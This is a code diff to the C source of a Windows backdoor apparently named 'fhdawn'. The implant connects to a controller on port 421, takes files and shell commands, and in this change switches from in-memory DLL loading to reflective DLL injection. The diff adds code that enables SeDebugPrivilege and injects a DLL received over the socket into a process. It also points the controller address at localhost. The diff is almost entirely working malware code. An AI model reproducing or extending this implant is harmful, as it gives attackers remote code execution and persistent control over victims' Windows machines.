@@ -6,12 +6,12 @@ Modified: -
 */
 
 #include "fhdawn.h"
-#include "MemoryModule.h"
+#include "LoadLibraryR.h"
 
 int fsize = 0;
-int result = -1;
 char* fileinfo[2];
-HMEMORYMODULE handle = NULL;
+#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }
+
 
 // By @augustgl (github.com/augustgl)
 void sockprintf(SOCKET sock, const char* words, ...) {
@@ -74,14 +74,14 @@ void fhdawn_main(void)
         }
         else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
         {
-            int fsize = 0; // return value for recv
+
             int expected = 0; // expected bytes of size
             char  temp[BUFFER]; // Temporary buffer to receive file information
-            char* fileinfo[2]; // to Store file information seperatley
             DWORD dwBytesWritten = 0; // number of bytes written
             BOOL write; // Return value of WriteFile();
 
             memset(temp, '\0', BUFFER); // Clear temp
+            memset(fileinfo, '\0', 2);
             int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
             if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) 
             {
@@ -119,6 +119,12 @@ void fhdawn_main(void)
         else if (strcmp(recvbuf, "fdll") == 0)
         {
             
+            TOKEN_PRIVILEGES priv = { 0 };
+            HANDLE hModule = NULL;
+            HANDLE hProcess = NULL;
+            HANDLE hToken = NULL;
+
+            
             memset(recvbuf, '\0', BUFFER);
             int return_code = recv(sockfd, recvbuf, BUFFER, 0);
             if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
@@ -127,9 +133,10 @@ void fhdawn_main(void)
             }
             split(recvbuf, fileinfo, ":");
             int expected = atoi(fileinfo[1]);
-            //unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
-            unsigned char* DLL = malloc(expected + 1);
+            unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
+            //unsigned char* DLL = malloc(expected + 1);
             memset(recvbuf, '\0', BUFFER);
+            ZeroMemory(DLL, expected + 1);
             int total = 0;
             do {
                 fsize = recv(sockfd, recvbuf, BUFFER, 0);
@@ -138,21 +145,35 @@ void fhdawn_main(void)
             } while (total != expected);
 
             sockprintf(sockfd, "Got DLL of size %i bytes.\n", total);
-            handle = MemoryLoadLibrary(DLL, expected);
-            if (handle == NULL)
-            {
-                sockprintf(sockfd,"Can't load library from memory.\n");
-            }
             
-            // result = MemoryCallEntryPoint(handle);
-            // if (result < 0) {
-            //     sockprintf(sockfd,"Could not execute entry point: %d\n", result);
-            // }
-            // else {
-            //     sockprintf(sockfd, "Executed in memory.\n");
-            // }
-            MemoryFreeLibrary(handle);
+            DWORD dwProcessId = GetCurrentProcessId();
+            do {
+                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+                {
+                    priv.PrivilegeCount = 1;
+                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+                        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
+
+                    CloseHandle(hToken);
+                }
+
+                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+                if (!hProcess)
+                    BREAK_WITH_ERROR("Failed to open the target process");
+
+                hModule = LoadRemoteLibraryR(hProcess, (LPVOID)DLL, expected + 1, NULL);
+                if (!hModule)
+                    BREAK_WITH_ERROR("Failed to inject the DLL");
+
+                WaitForSingleObject(hModule, -1);
+            } while (0);
+
             free(DLL);
+            if (hProcess)
+                CloseHandle(hProcess);
+
         }
         else {
             ExecSock();
@@ -189,7 +210,7 @@ void MainConnect(void)
         exit(1);
     }
 
-    server.sin_addr.s_addr = inet_addr("192.168.0.104");
+    server.sin_addr.s_addr = inet_addr("127.0.0.1");
     server.sin_port = htons(421);
     server.sin_family = AF_INET;
 
